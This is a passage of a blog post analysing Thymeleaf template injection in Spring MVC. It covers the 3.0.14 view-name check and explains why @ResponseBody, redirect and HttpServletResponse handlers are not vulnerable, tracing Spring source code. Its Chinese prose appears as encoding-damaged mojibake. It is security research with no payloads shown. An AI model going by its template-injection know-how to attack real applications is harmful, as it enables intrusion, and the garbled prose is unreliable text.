<p>å¦‚æœå‘ç°è·¯å¾„ä¸­å­˜åœ¨åˆ†å·ï¼Œé‚£ä¹ˆä¼šè°ƒç”¨<code>removeSemicolonContent</code>æ–¹æ³•æ¥ç§»é™¤åˆ†å·</p>
</blockquote>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A543.png" srcset="/img/loading.gif" lazyload></p>
<h5 id="3-0-14"><a href="#3-0-14" class="headerlink" title="3.0.14"></a>3.0.14</h5><p>è¿™ä¸ªç‰ˆæœ¬çš„<code>checkViewNameNotInRequest()</code>æœ‰äº†ä¸€äº›æ”¹åŠ¨ï¼Œè¿™ä¸ªæš‚æ—¶è¿˜ä¸çŸ¥é“è¯¥å¦‚ä½•è¿‡å»ğŸ˜­</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">checkViewNameNotInRequest</span><span class="hljs-params">(String viewName, HttpServletRequest request)</span> </span>&#123;<br>    String vn = StringUtils.pack(viewName);	<span class="hljs-comment">// è·å–è§†å›¾å</span><br>    <span class="hljs-keyword">if</span> (containsExpression(vn)) &#123;	<span class="hljs-comment">// åˆ¤æ–­è§†å›¾åä¸­æ˜¯å¦åŒ…å«thymeleafçš„ä¸€äº›è¡¨è¾¾å¼</span><br>        <span class="hljs-keyword">boolean</span> found = <span class="hljs-keyword">false</span>;<br>        <span class="hljs-comment">// è·å–URI</span><br>        String requestURI = StringUtils.pack(UriEscape.unescapeUriPath(request.getRequestURI()));<br>        <span class="hljs-keyword">if</span> (requestURI != <span class="hljs-keyword">null</span> &amp;&amp; containsExpression(requestURI)) &#123;	<span class="hljs-comment">// URIä¸ä¸ºç©ºï¼Œä¸”URIä¸­åŒ…å«è¡¨è¾¾å¼ï¼Œç›´æ¥G</span><br>            found = <span class="hljs-keyword">true</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (!found) &#123;<br>            Enumeration paramNames = request.getParameterNames();	<span class="hljs-comment">// è·å–å‚æ•°åå¹¶å­˜å…¥åˆ°æšä¸¾å¯¹è±¡ä¸­</span><br><br>            <span class="hljs-keyword">while</span>(!found &amp;&amp; paramNames.hasMoreElements()) &#123;	<span class="hljs-comment">// å­˜åœ¨æšä¸¾å…ƒç´ </span><br>                <span class="hljs-comment">// è·å–æ‰€æœ‰å‚æ•°å€¼ï¼Œå­˜å…¥String[] ä¸­</span><br>                String[] paramValues = request.getParameterValues((String)paramNames.nextElement());<br>		<br>                <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; !found &amp;&amp; i &lt; paramValues.length; ++i) &#123;	<br>                    String paramValue = StringUtils.pack(paramValues[i]);	<span class="hljs-comment">// å–å‡ºå‚æ•°å€¼</span><br>                    <span class="hljs-comment">// å‚æ•°å€¼ä¸ä¸ºç©ºï¼Œå¹¶ä¸”å‚æ•°å€¼ä¸­åŒ…å«è¡¨è¾¾å¼ï¼Œå¹¶ä¸”è§†å›¾åç§°ä¸­åŒ…å«è¯¥å‚æ•°å€¼ï¼Œåˆ™G</span><br>                    <span class="hljs-keyword">if</span> (paramValue != <span class="hljs-keyword">null</span> &amp;&amp; containsExpression(paramValue) &amp;&amp; vn.contains(paramValue)) &#123;<br>                        found = <span class="hljs-keyword">true</span>;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (found) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> TemplateProcessingException(<span class="hljs-string">&quot;View name contains an expression and so does either the URL path or one of the request parameters. This is forbidden in order to reduce the possibilities that direct user input is executed as a part of the view name.&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h4 id="2-ResponseBody"><a href="#2-ResponseBody" class="headerlink" title="2.@ResponseBody"></a>2.@ResponseBody</h4><p>@responseBodyæ³¨è§£çš„ä½œç”¨æ˜¯å°†controllerçš„æ–¹æ³•è¿”å›çš„å¯¹è±¡é€šè¿‡é€‚å½“çš„è½¬æ¢å™¨è½¬æ¢ä¸ºæŒ‡å®šçš„æ ¼å¼ä¹‹åï¼Œå†™å…¥åˆ°responseå¯¹è±¡çš„bodyåŒºï¼Œé€šå¸¸ç”¨æ¥è¿”å›JSONæ•°æ®æˆ–è€…æ˜¯XMLæ•°æ®ã€‚ä¹Ÿå°±æ˜¯è¯´ç°åœ¨æœåŠ¡ç«¯è¿”å›çš„åªæ˜¯ä¸€æ®µæ•°æ®ï¼ˆæ•°æ®æ ¼å¼éœ€è¦è‡ªè¡ŒæŒ‡å®šï¼‰ï¼Œä¸å†æ˜¯ä¸€ä¸ªæ¸²æŸ“ä¹‹åçš„è§†å›¾äº†ï¼Œä¸éœ€è¦æ¸²æŸ“ï¼Œè‡ªç„¶ä¸ä¼šå­˜åœ¨è¡¨è¾¾å¼è§£æç­‰æ­¥éª¤ï¼Œæ‰€ä»¥æ­¤æ—¶ä¸ä¼šå­˜åœ¨ã€‚</p>
<p>ç¤ºä¾‹ï¼šæ­¤å¤„å°†controllerçš„è¿”å›å€¼ä¸ºStringï¼Œå¹¶ä¸”æœ‰@responseBodyæ³¨è§£ï¼Œä¸ä¼šå†è¿›è¡Œæ¸²æŸ“ï¼Œæ‰€ä»¥åªæ˜¯å°†pathè¿›è¡Œæ‹¼æ¥ä¹‹åè¿”å›</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-meta">@RequestMapping(&quot;/test&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">vulTest</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String path)</span></span>&#123;<br>    log.info(<span class="hljs-string">&quot;path:&quot;</span> + path);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;xxx/&quot;</span> + path + <span class="hljs-string">&quot;/zzz&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A521.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="3-redirect"><a href="#3-redirect" class="headerlink" title="3.redirect"></a>3.redirect</h4><p>é‡å®šå‘ï¼Œç›´æ¥è·³è½¬åˆ°å…¶ä»–é¡µé¢ï¼Œæ­¤æ—¶æ˜¯å› ä¸ºspringmvcä¸å†ä½¿ç”¨Thymeleafè§†å›¾è§£æå™¨ï¼Œæ‰€ä»¥å¯¼è‡´æ¼æ´ä¸å­˜åœ¨äº†</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/test&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">vulTest</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String path)</span></span>&#123;<br>    log.info(<span class="hljs-string">&quot;path:&quot;</span> + path);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:xxx/&quot;</span> + path + <span class="hljs-string">&quot;/zzz&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A528.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="4-HttpServletResponse"><a href="#4-HttpServletResponse" class="headerlink" title="4.HttpServletResponse"></a>4.HttpServletResponse</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/test/&#123;path&#125;&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">vulTest02</span><span class="hljs-params">(HttpServletResponse response)</span></span>&#123;<br>        log.info(<span class="hljs-string">&quot;Test02&quot;</span>);<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>è‡ªå®šä¹‰è¿”å›ï¼Œå½“å‚æ•°ä¸­å­˜åœ¨HttpServletResponseæ—¶ï¼ŒSpringMVCè®¤ä¸ºæ­¤æ—¶ç”¨æˆ·è‡ªå®šä¹‰äº†è¿”å›æ•°æ®ï¼Œæ— éœ€SpringMVCå¸®åŠ©å¤„ç†ï¼Œæ‰€ä»¥æ­¤ç§æƒ…å†µä¸‹åŒæ ·ä¸å­˜åœ¨æ¼æ´</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A529.png" srcset="/img/loading.gif" lazyload></p>
<p>å…¶åŸå› æ˜¯å½“æ§åˆ¶å™¨å­˜åœ¨HttpServletResponseç±»å‹çš„å‚æ•°æ—¶ï¼Œåœ¨è·å–å˜é‡æ—¶ä¼šå°†<code>ModelAndViewContainer</code>å¯¹è±¡çš„<code>requestHandled</code>å€¼ç½®ä¸ºtrueï¼Œè¿›è€Œå¯¼è‡´<code>ModelAndViewContainer</code>å¯¹è±¡ä¸ºnullï¼Œä¹Ÿå°±æ˜¯mvä¸ºnullã€‚å…·ä½“åˆ†ææ€è·¯å¦‚ä¸‹</p>
<p><code>DispatchServlet</code>    <code>ha.handle(processedRequest, response, mappedHandler.getHandler())</code> å¤„ä¸‹æ–­ï¼Œè·Ÿè¿›handleæ–¹æ³•</p>
<p>æ¥åˆ°<code>this.handleInternal(request, response, (HandlerMethod)handler);</code>ï¼Œç»§ç»­è·Ÿè¿›</p>
<p>æ¥åˆ°<code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter</code> çš„ <code>handleInternal</code>æ–¹æ³•</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A530.png" srcset="/img/loading.gif" lazyload></p>
<p>æ¥åˆ°è¯¥ç±»çš„<code>invokeHandlerMethod()</code>ï¼Œä¸€äº›åŸºç¡€è®¾ç½®æ²¡å¿…è¦çœ‹ï¼Œç›´æ¥åˆ°æ¥ç¬¬543è¡Œï¼Œè·Ÿè¿›</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A531.png" srcset="/img/loading.gif" lazyload></p>
<p>æ¥åˆ°è¯¥ç±»çš„<code>invokeAndHandle</code>æ–¹æ³•ï¼Œç›´æ¥è·Ÿè¿›<code>this.invokeForRequest(webRequest, mavContainer, providedArgs);</code></p>
<p>æ¥åˆ°<code>org.springframework.web.method.support.InvocableHandlerMethod</code>çš„<code>invokeForRequest</code>æ–¹æ³•</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A532.png" srcset="/img/loading.gif" lazyload></p>
<p>æ¥åˆ°<code>getMethodArgumentValues</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•æœ¬èº«æ˜¯ç”¨æ¥è·å–å‚æ•°çš„ï¼Œä½†æ˜¯<code>args[i] = this.resolvers.resolveArgument(parameter, mavContainer, request, this.dataBinderFactory);</code>è¿™ä¸€è¡Œä¼šæ”¹å˜<code>mavContainer</code>ä¸­<code>requestHandled</code>çš„å€¼ï¼Œç›´æ¥è·Ÿè¿›è¿™ä¸€è¡Œ</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> Object[] getMethodArgumentValues(NativeWebRequest request, <span class="hljs-meta">@Nullable</span> ModelAndViewContainer mavContainer, Object... providedArgs) <span class="hljs-keyword">throws</span> Exception &#123;<br>    MethodParameter[] parameters = <span class="hljs-keyword">this</span>.getMethodParameters();<br>    <span class="hljs-keyword">if</span> (ObjectUtils.isEmpty(parameters)) &#123;	<span class="hljs-comment">// åˆ¤æ–­å‚æ•°åˆ—è¡¨æ˜¯å¦ä¸ºç©º</span><br>        <span class="hljs-keyword">return</span> EMPTY_ARGS;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        Object[] args = <span class="hljs-keyword">new</span> Object[parameters.length];	<span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªObjectæ•°æ®ï¼Œå‡†å¤‡æ¥æ”¶å‚æ•°</span><br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; parameters.length; ++i) &#123;	<span class="hljs-comment">// éå†å‚æ•°åˆ—è¡¨</span><br>            MethodParameter parameter = parameters[i];<br>            parameter.initParameterNameDiscovery(<span class="hljs-keyword">this</span>.parameterNameDiscoverer);	<span class="hljs-comment">// å‚æ•°åˆå§‹åŒ–</span><br>            args[i] = findProvidedArgument(parameter, providedArgs);	<span class="hljs-comment">// ä¸€ç§å‡å®šï¼Ÿï¼Ÿä¸æ˜¯å¾ˆç†è§£ï¼Œä½†ä¸é‡è¦</span><br>            <span class="hljs-keyword">if</span> (args[i] == <span class="hljs-keyword">null</span>) &#123;<br>                <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">this</span>.resolvers.supportsParameter(parameter)) &#123;	<br>                    <span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦æœ‰åˆé€‚çš„å‚æ•°è§£æå™¨ï¼Œä¹Ÿå°±æ˜¯åˆ¤æ–­æ˜¯å¦æ”¯æŒè¯¥å‚æ•°ç±»å‹</span><br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalStateException(formatArgumentError(parameter, <span class="hljs-string">&quot;No suitable resolver&quot;</span>));<br>                &#125;<br><br>                <span class="hljs-keyword">try</span> &#123;	<br>                    args[i] = <span class="hljs-keyword">this</span>.resolvers.resolveArgument(parameter, mavContainer, request, <span class="hljs-keyword">this</span>.dataBinderFactory);	<span class="hljs-comment">// è·å–å‚æ•°ï¼Œä»¥åŠå½“å‚æ•°ç±»å‹ä¸ºHttpServletResponseæ—¶åšä¸€äº›è®¾ç½®</span><br>                &#125; <span class="hljs-keyword">catch</span> (Exception var10) &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.logger.isDebugEnabled()) &#123;<br>                        String exMsg = var10.getMessage();<br>                        <span class="hljs-keyword">if</span> (exMsg != <span class="hljs-keyword">null</span> &amp;&amp; !exMsg.contains(parameter.getExecutable().toGenericString())) &#123;<br>                            <span class="hljs-keyword">this</span>.logger.debug(formatArgumentError(parameter, exMsg));<br>                        &#125;<br>                    &#125;<br><br>                    <span class="hljs-keyword">throw</span> var10;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> args;	<span class="hljs-comment">// è¿”å›å‚æ•°åˆ—è¡¨</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æ¥åˆ°<code>org.springframework.web.method.support.HandlerMethodArgumentResolverComposite</code>çš„<code>resolveArgument</code>æ–¹æ³•</p>
<p>å½“å‚æ•°ç±»å‹æ˜¯ï¼šæ™®é€šå‚æ•°ç±»å‹ï¼ˆä¾‹å¦‚ï¼šString\Integer\Doubleï¼‰æ—¶</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A533.png" srcset="/img/loading.gif" lazyload></p>
<p>æ­¤æ—¶è·Ÿè¿›ç¬¬65è¡Œï¼Œè¿›å…¥åˆ°<code>org.springframework.web.method.annotation.AbstractNamedValueMethodArgumentResolver</code>çš„<code>resolveArgument</code>æ–¹æ³•ä¸­</p>
<p>å½“å‚æ•°ç±»å‹æ˜¯ï¼šHttpServletResponseæ—¶</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A534.png" srcset="/img/loading.gif" lazyload></p>
<p>æ­¤æ—¶è·Ÿè¿›ç¬¬65è¡Œï¼Œè¿›å…¥åˆ°<code>org.springframework.web.servlet.mvc.method.annotation.ServletResponseMethodArgumentResolver</code>çš„<code>resolveArgument</code>æ–¹æ³•ä¸­</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">resolveArgument</span><span class="hljs-params">(MethodParameter parameter, <span class="hljs-meta">@Nullable</span> ModelAndViewContainer mavContainer, NativeWebRequest webRequest, <span class="hljs-meta">@Nullable</span> WebDataBinderFactory binderFactory)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>    <span class="hljs-keyword">if</span> (mavContainer != <span class="hljs-keyword">null</span>) &#123;		<span class="hljs-comment">// ä¸ºçœŸ</span><br>        mavContainer.setRequestHandled(<span class="hljs-keyword">true</span>);  <span class="hljs-comment">// requestHandledçš„å€¼è®¾ç½®ä¸ºtrue</span><br>    &#125;<br><br>    Class&lt;?&gt; paramType = parameter.getParameterType();<br>    <span class="hljs-keyword">return</span> ServletResponse.class.isAssignableFrom(paramType) ? <span class="hljs-keyword">this</span>.resolveNativeResponse(webRequest, paramType) : <span class="hljs-keyword">this</span>.resolveArgument(paramType, (ServletResponse)<span class="hljs-keyword">this</span>.resolveNativeResponse(webRequest, ServletResponse.class));<br>&#125;<br></code></pre></td></tr></table></figure>

<p>å›åˆ°<code>RequestMappingHandlerAdapter</code>ç¬¬545è¡Œï¼Œè·Ÿè¿›</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A535.png" srcset="/img/loading.gif" lazyload></p>
<p>æ¥åˆ°<code>RequestMappingHandlerAdapter</code>ç¬¬545è¡Œ</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A536.png" srcset="/img/loading.gif" lazyload></p>
<p>åˆ°è¿™é‡ŒåŸºæœ¬ç†è§£äº†mvä¸ºç©ºçš„åŸå› ï¼Œmvä¸ºç©ºï¼Œä¸éœ€è¦æ¸²æŸ“äº†ï¼Œæ‰€ä»¥æ¼æ´ä¹Ÿä¸å­˜åœ¨äº†</p>
<h3 id="0x05-å‚è€ƒé“¾æ¥"><a href="#0x05-å‚è€ƒé“¾æ¥" class="headerlink" title="0x05 å‚è€ƒé“¾æ¥"></a>0x05 å‚è€ƒé“¾æ¥</h3><ul>
<li><a target="_blank" rel="noopener" href="https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html#messages">æ•™ç¨‹ï¼šä½¿ç”¨ Thymeleaf</a></li>
<li><a target="_blank" rel="noopener" href="https://forum.butian.net/index.php/share/1922">Thymeleaf SSTI</a></li>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/254519#h3-5">Javaå®‰å…¨ä¹‹Thymeleaf SSTIåˆ†æ</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8568#toc-3">ç”±WCTF2020 Thymeleafåˆ†æpayloadå½¢å¼</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/veracode-research/spring-view-manipulation">spring-view-manipulation</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/CPLASF_/article/details/110189503">springmvcæºç -å‚æ•°è§£æ</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnpanda.net/sec/1063.html">Thymeleaf SSTI åˆ†æä»¥åŠæœ€æ–°ç‰ˆä¿®å¤çš„ Bypass</a></li>
</ul>

              
            </div>
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Thymeleafæ¨¡æ¿æ³¨å…¥</div>
      <div>http://example.com/2022/11/26/Thymeleafæ¨¡æ¿æ³¨å…¥/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>ä½œè€…</div>
          <div>Mechoy</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>å‘å¸ƒäº</div>
          <div>2022å¹´11æœˆ26æ—¥</div>
        </div>
      
      
      <div class="license-meta-item">
        <div>è®¸å¯åè®®</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - ç½²å">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/03/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Javaååºåˆ—åŒ–">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Javaååºåˆ—åŒ–</span>
                        <span class="visible-mobile">ä¸Šä¸€ç¯‡</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/09/03/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/" title="JavaåŠ¨æ€ä»£ç†">
                        <span class="hidden-mobile">JavaåŠ¨æ€ä»£ç†</span>
                        <span class="visible-mobile">ä¸‹ä¸€ç¯‡</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;ç›®å½•</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  






    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">æœç´¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">å…³é”®è¯</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://mechoy.github.io" target="_blank" rel="nofollow noopener"><span>Mechoy</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>






  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script>
  (function() {
    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
    var enableCopy = CONFIG.copy_btn;
    if (!enableLang && !enableCopy) {
      return;
    }

    function getBgClass(ele) {
      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
    }

    var copyTmpl = '';
    copyTmpl += '<div class="code-widget">';
    copyTmpl += 'LANG';
    copyTmpl += '</div>';
    jQuery('.markdown-body pre').each(function() {
      var $pre = jQuery(this);
      if ($pre.find('code.mermaid').length > 0) {
        return;
      }
      if ($pre.find('span.line').length > 0) {
        return;
      }

      var lang = '';

      if (enableLang) {
        lang = CONFIG.code_language.default;
        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
          lang = $pre[0].children[0].classList[1];
        } else if ($pre[0].getAttribute('data-language')) {
          lang = $pre[0].getAttribute('data-language');
        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
          lang = $pre[0].children[0].classList[1];
          $pre.parent().addClass('code-wrapper');
        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
          $pre.wrap('<div class="code-wrapper"></div>');
        }
        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
      }
      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));

      if (enableCopy) {
        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
          var clipboard = new window.ClipboardJS('.copy-btn', {
            target: function(trigger) {
              var nodes = trigger.parentNode.childNodes;
              for (var i = 0; i < nodes.length; i++) {
                if (nodes[i].tagName === 'CODE') {
                  return nodes[i];
                }
              }
            }
          });
          clipboard.on('success', function(e) {
            e.clearSelection();
            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
            setTimeout(function() {
